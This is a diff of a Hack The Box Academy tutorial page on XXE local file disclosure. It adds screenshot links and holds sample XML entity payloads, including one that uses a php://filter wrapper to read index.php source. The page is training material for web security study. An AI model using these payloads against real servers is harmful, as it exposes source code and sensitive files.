@@ -7,7 +7,7 @@
 // Module Difficulty: Medium
 // Section ID: 1204
 // Section Title: Local File Disclosure
-// Page Title: Web Attacks
+// Page Title: Hack The Box - Academy
 // Page Number: 14
 -->
 
@@ -15,17 +15,27 @@
 
 **Module Name:** Web Attacks **Page Number:** 14
 
+#### 
+
 #### WEB ATTACKS
 
 # Local File Disclosure
 
 ## Identifying
 
+![https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_identify.jpg](https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_identify.jpg)
+
+![https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_request.jpg](https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_request.jpg)
+
+![https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_response.jpg](https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_response.jpg)
+
 ``` xml
 <!DOCTYPE email [
   <!ENTITY company "Inlane Freight">
 ]>
 ```
+
+![https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_new_entity.jpg](https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_new_entity.jpg)
 
 ## Reading Sensitive Files
 
@@ -35,13 +45,19 @@
 ]>
 ```
 
+![https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_external_entity.jpg](https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_external_entity.jpg)
+
 ## Reading Source Code
+
+![https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_file_php.jpg](https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_file_php.jpg)
 
 ``` xml
 <!DOCTYPE email [
   <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
 ]>
 ```
+
+![https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_php_filter.jpg](https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_php_filter.jpg)
 
 ## Remote Code Execution with XXE
 
